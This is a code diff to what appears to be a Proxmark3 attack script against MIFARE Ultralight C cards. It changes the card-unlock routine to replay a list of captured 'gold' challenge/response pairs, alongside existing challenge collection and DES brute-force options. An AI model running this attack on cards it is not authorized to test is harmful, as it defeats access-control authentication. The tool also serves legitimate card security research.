@@ -232,13 +232,12 @@ class CrackEffect:
         scramble_thread.join()
 
 
-def try_unlock(num_challenges: int, erndb: str, erndarndb: str, p) -> bool:
-    """Try to unlock the card by using the provided reader response
+def try_unlock(num_challenges: int, dict_erndberndarndb: dict, p) -> bool:
+    """Try to unlock the card by using the provided reader responses
 
     Args:
         num_challenges (int): Number of challenge reads to attempt.
-        erndb (str): Card challenge to look for.
-        erndarndb (str): Reader response to use.
+        dict_erndberndarndb (dict): Dictionary mapping card challenges to reader responses.
         p: Proxmark3 instance used to issue raw commands and read responses.
 
     Returns:
@@ -260,8 +259,8 @@ def try_unlock(num_challenges: int, erndb: str, erndarndb: str, p) -> bool:
             if progress >= next_progress:
                 print(f"[=] Progress: {min(progress, 100)}%")
                 next_progress += 10
-            if hex_challenge == erndb:
-                p.console(f"hf 14a raw -ck AF{erndarndb}")
+            if hex_challenge in dict_erndberndarndb:
+                p.console(f"hf 14a raw -ck AF{dict_erndberndarndb[hex_challenge]}")
                 response = p.grabbed_output.split()
                 if (len(response) > 8) and (response[1] == "00"):
                     print("[+] Unlock successful!")
@@ -389,13 +388,11 @@ def is_known_counterfeit(p) -> bool:
     return False
 
 
-def collect(num_challenges: int, p, debug: bool, force: bool = False,
-            erndarndb: Optional[str] = None) -> Optional[dict]:
+def collect(p, debug: bool, force: bool = False) -> Optional[dict]:
     """
     Collect challenges from the card and check if it is vulnerable.
 
     Args:
-        num_challenges (int): Number of challenges to collect.
         p: Proxmark3 instance.
         debug (bool): Enable debug mode.
         force (bool): Force the attack even if the card does not appear vulnerable (dangerous!).
@@ -541,29 +538,30 @@ def main():
                         help='Use CUDA implementation')
     parser.add_argument('--force', action='store_true',
                         help='Force the attack even if the card does not appear vulnerable (dangerous!)')
-    parser.add_argument('--get_frequent_chal', action='store_true',
+    parser.add_argument('--get_frequent_chals', action='store_true',
                         help='Collect a "gold" challenge to perform an unlock, and quit afterwards')
-    parser.add_argument('--unlock', help='Unlock a card with a "gold" challenge/response pair',
-                        type=str, metavar='ERndB,ERndARndB\'')
+    parser.add_argument('--unlock', help='Unlock a card with a list of "gold" challenge/response pairs, '
+                        'separated by commas, in the format ERndB:ERndARndB\'',
+                        type=str, metavar='ERndB:ERndARndB,...\'')
     args = parser.parse_args()
     debug = args.debug
     num_challenges = args.challenges
     offline = args.offline
     use_cuda = args.cuda
     force = args.force
-    get_frequent_chal = args.get_frequent_chal
-    erndb, erndarndb = args.unlock.split(',') if args.unlock else (None, None)
+    get_frequent_chals = args.get_frequent_chals
+    list_erndberndarndb = args.unlock.split(',') if args.unlock else []
     brute_tool = tools["mfulc_des_brute_cuda"] if use_cuda else tools["mfulc_des_brute"]
 
-    if get_frequent_chal and (offline or args.json or force or use_cuda):
+    if get_frequent_chals and (offline or args.json or force or use_cuda):
         print("[-] Error: --get_frequent_chal can only be combined with --challenges")
         return
 
-    if (erndb or erndarndb) and offline:
+    if list_erndberndarndb and offline:
         print("[-] Error: --unlock can'n be combined with --offline")
         return
 
-    if get_frequent_chal:
+    if get_frequent_chals:
         import pm3
         p = pm3.pm3()
         uid = get_ulc_uid(p)
@@ -602,12 +600,18 @@ def main():
     if not offline:
         import pm3
         p = pm3.pm3()
-        if erndb and erndarndb:
-            erndb = erndb.upper()
-            erndarndb = erndarndb.upper()
-            if not try_unlock(num_challenges, erndb, erndarndb, p):
+        if len(list_erndberndarndb) > 0:
+            dict_erndberndarndb = {}
+            for pair in list_erndberndarndb:
+                try:
+                    erndb, erndarndb = pair.split(':')
+                    dict_erndberndarndb[erndb.upper()] = erndarndb.upper()
+                except ValueError:
+                    print(f"[-] Error: Invalid format for --unlock pair '{pair}'. Expected format is ERndB:ERndARndB'")
+                    return
+            if not try_unlock(num_challenges, dict_erndberndarndb, p):
                 return
-        challenges = collect(num_challenges, p, debug, force, erndarndb)
+        challenges = collect(p, debug, force)
         if challenges is None:
             return
         if args.json:
